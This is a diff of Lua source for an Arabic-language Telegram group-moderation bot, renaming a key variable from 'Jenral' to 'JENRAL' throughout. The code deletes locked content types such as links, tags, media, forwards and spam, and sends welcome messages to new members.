+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         Inline         --
 elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
 if not VipMem(msg) then
-if DevALI:get(Jenral..'ALI:Lock:Inline'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Inline'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --        Sticker         --
 elseif msg.content_.ID == "MessageSticker" then
 if not VipMem(msg) then
-if DevALI:get(Jenral..'ALI:Lock:Stickers'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Stickers'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 elseif msg.content_.ID == "MessageChatJoinByLink" then
-if DevALI:get(Jenral..'ALI:Lock:TagServr'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return
 end
 function get_welcome(extra,result,success)
-if DevALI:get(Jenral..'ALI:Groups:Welcomes'..msg.chat_id_) then
-Welcomes = DevALI:get(Jenral..'ALI:Groups:Welcomes'..msg.chat_id_)
+if DevALI:get(JENRAL..'ALI:Groups:Welcomes'..msg.chat_id_) then
+Welcomes = DevALI:get(JENRAL..'ALI:Groups:Welcomes'..msg.chat_id_)
 else
 Welcomes = '• نورت حبي \n• firstname \n• username'
 end
@@ -2681,20 +2681,20 @@ local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
 local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@GENRALTEAM]'))
 Dev_ALI(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end 
-if DevALI:get(Jenral.."ALI:Lock:Welcome"..msg.chat_id_) then
+if DevALI:get(JENRAL.."ALI:Lock:Welcome"..msg.chat_id_) then
 getUser(msg.sender_user_id_,get_welcome)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --      New User Add      --
 elseif msg.content_.ID == "MessageChatAddMembers" then
-if not DevALI:get(Jenral..'ALI:Lock:BotWelcome') then 
-tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Jenral,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
+if not DevALI:get(JENRAL..'ALI:Lock:BotWelcome') then 
+tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = JENRAL,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
 for i=0,#msg.content_.members_ do    
 BotWelcome = msg.content_.members_[i].id_    
-if BotWelcome and BotWelcome == tonumber(Jenral) then 
-if DevALI:sismember(Jenral..'ALI:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n⌁︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n⌁︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
-if DevALI:get(Jenral.."ALI:Text:BotWelcome") then ALIText = DevALI:get(Jenral.."ALI:Text:BotWelcome") else ALIText = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙حالة المجموعه ↫ "..BotText.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉" end 
-if DevALI:get(Jenral.."ALI:Photo:BotWelcome") then ALIPhoto = DevALI:get(Jenral.."ALI:Photo:BotWelcome") elseif abbas.photos_[0] then ALIPhoto = abbas.photos_[0].sizes_[1].photo_.persistent_id_ else ALIPhoto = nil end 
+if BotWelcome and BotWelcome == tonumber(JENRAL) then 
+if DevALI:sismember(JENRAL..'ALI:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n⌁︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n⌁︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
+if DevALI:get(JENRAL.."ALI:Text:BotWelcome") then ALIText = DevALI:get(JENRAL.."ALI:Text:BotWelcome") else ALIText = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙حالة المجموعه ↫ "..BotText.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉" end 
+if DevALI:get(JENRAL.."ALI:Photo:BotWelcome") then ALIPhoto = DevALI:get(JENRAL.."ALI:Photo:BotWelcome") elseif abbas.photos_[0] then ALIPhoto = abbas.photos_[0].sizes_[1].photo_.persistent_id_ else ALIPhoto = nil end 
 if ALIPhoto ~= nil then
 sendPhoto(msg.chat_id_,msg.id_,0,1,nil,ALIPhoto,ALIText)
 else 
@@ -2704,7 +2704,7 @@ end
 end
 end,nil)
 end
-if DevALI:get(Jenral..'ALI:Lock:TagServr'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return
 end
@@ -2718,9 +2718,9 @@ ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
 DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
 return false
 end
-if DevALI:get(Jenral.."ALI:Lock:Welcome"..msg.chat_id_) then
-if DevALI:get(Jenral..'ALI:Groups:Welcomes'..msg.chat_id_) then
-Welcomes = DevALI:get(Jenral..'ALI:Groups:Welcomes'..msg.chat_id_)
+if DevALI:get(JENRAL.."ALI:Lock:Welcome"..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Groups:Welcomes'..msg.chat_id_) then
+Welcomes = DevALI:get(JENRAL..'ALI:Groups:Welcomes'..msg.chat_id_)
 else
 Welcomes = '• نورت حبي \n• firstname \n• username'
 end
@@ -2729,410 +2729,410 @@ local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_
 local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@GENRALTEAM]'))
 Dev_ALI(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --        Contact         --
 elseif msg.content_.ID == "MessageContact" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Contact'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Contact'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         Audio          --
 elseif msg.content_.ID == "MessageAudio" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Music'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Music'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         Voice          --
 elseif msg.content_.ID == "MessageVoice" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Voice'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Voice'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --        Location        --
 elseif msg.content_.ID == "MessageLocation" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Location'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Location'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         Video          --
 elseif msg.content_.ID == "MessageVideo" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Videos'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Videos'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --          Gif           --
 elseif msg.content_.ID == "MessageAnimation" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Gifs'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Gifs'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         Text           --
 elseif msg.content_.ID == "MessageText" then
 if not VipMem(msg) then
 Filters(msg,text)
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Text'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Text'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.text_:match("@") then
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.text_:match("#") then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.text_:match("[\216-\219][\128-\191]") then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.text_ then
 local _nl, ctrl_chars = string.gsub(text, '%c', '')
 local _nl, real_digits = string.gsub(text, '%d', '')
-if not DevALI:get(Jenral..'ALI:Spam:Text'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Spam:Text'..msg.chat_id_) then
 sens = 400
 else
-sens = tonumber(DevALI:get(Jenral..'ALI:Spam:Text'..msg.chat_id_))
+sens = tonumber(DevALI:get(JENRAL..'ALI:Spam:Text'..msg.chat_id_))
 end
-if DevALI:get(Jenral..'ALI:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
+if DevALI:get(JENRAL..'ALI:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
